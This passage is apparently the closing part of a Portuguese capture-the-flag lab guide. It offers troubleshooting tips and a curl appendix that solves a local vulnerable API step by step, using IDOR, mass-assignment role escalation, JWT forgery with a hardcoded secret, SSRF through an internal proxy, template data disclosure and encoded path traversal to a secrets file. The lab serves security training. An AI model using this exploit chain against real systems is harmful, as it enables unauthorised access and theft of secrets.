- Worker nao processou: aguarde alguns segundos e verifique:

```bash
docker logs lab04-worker
```

- Output errado: confira o nome do arquivo em `/api/v2/jobs/output?file=...`.
- Leitura final 403: use `%2f` em vez de `/` no traversal.
- Leitura final 404: confirme o caminho relativo a partir de `/app/logs`: `..%2fsecrets%2ffinal.flag`.

## Apendice - Validacao rapida com curl

Esta secao e apenas para validacao rapida. A resolucao principal do lab e manual com navegador, DevTools e Burp.

```bash
BASE=http://127.0.0.1:8094
COOKIE=/tmp/lab04-sentinel.cookies
rm -f "$COOKIE"
```

Login e identidade:

```bash
curl -i -c "$COOKIE" \
  -d "username=intern" \
  -d "password=intern2026" \
  "$BASE/login"

curl -s -b "$COOKIE" "$BASE/api/v2/me" | jq
```

BOLA/IDOR:

```bash
curl -s -b "$COOKIE" "$BASE/api/v2/alerts" | jq

curl -s -b "$COOKIE" "$BASE/api/v2/alerts/7391" | jq

curl -s -b "$COOKIE" \
  -H "X-Sentinel-Client: web-console" \
  -H "X-Tenant-Scope: ACME-SOC" \
  "$BASE/api/v2/alerts/7391" | jq
```

Mass Assignment e role `analyst`:

```bash
curl -i -b "$COOKIE" -c "$COOKIE" \
  -X PATCH "$BASE/api/v2/me/profile" \
  -H "Content-Type: application/json" \
  -d '{"displayName":"Intern Analyst","preferences":{"density":"compact"},"role":"analyst"}'

curl -i -b "$COOKIE" -c "$COOKIE" \
  -X PATCH "$BASE/api/v2/me/profile" \
  -H "Content-Type: application/json" \
  -d '{"displayName":"Intern Analyst","preferences":{"density":"compact"},"access":{"requestedRole":"analyst"}}'

curl -s -b "$COOKIE" "$BASE/api/v2/me" | jq
```

Debug e artefato:

```bash
curl -s -b "$COOKIE" "$BASE/api/v2/debug/health" | jq
curl -s -b "$COOKIE" "$BASE/api/v2/artifacts/build-manifest" | jq
```

JWT admin:

```bash
export ADMIN_TOKEN=$(docker exec lab04-sentinel-app node -e "const jwt=require('jsonwebtoken'); console.log(jwt.sign({id:1,username:'intern',role:'admin',scope:['admin:read']}, 'sentinelcore-dev-2026'))")
echo "$ADMIN_TOKEN"

curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  http://127.0.0.1:8094/api/v2/admin/final | jq
```

SSRF:

```bash
curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://internal-admin:8081/status"}' \
  "$BASE/api/v2/integrations/check" | jq
```

Proxy interno:

```bash
curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://internal-admin:8081/internal/users","headers":{"x-internal-token":"internal-admin-token-7f3a9c21"}}' \
  "$BASE/api/v2/integrations/proxy" | jq

curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://internal-admin:8081/internal/config","headers":{"x-internal-token":"internal-admin-token-7f3a9c21"}}' \
  "$BASE/api/v2/integrations/proxy" | jq
```

Template context disclosure:

```bash
curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"title":"debug","template":"user={{user.username}} role={{user.role}} secret={{config.jwt_hint}} internal={{config.internal_token_hint}}"}' \
  "$BASE/api/v2/reports/render" | jq
```

Queue/worker:

```bash
curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"type":"token.debug","source":"manual","output":"worker-token.txt"}' \
  "$BASE/api/v2/jobs" | jq

sleep 2

curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "$BASE/api/v2/jobs/output?file=worker-token.txt"
```

Leitura normal e flag final:

```bash
curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "$BASE/api/v2/admin/diagnostics/read?file=app.log"

curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "$BASE/api/v2/admin/diagnostics/read?file=..%2fsecrets%2ffinal.flag"
```
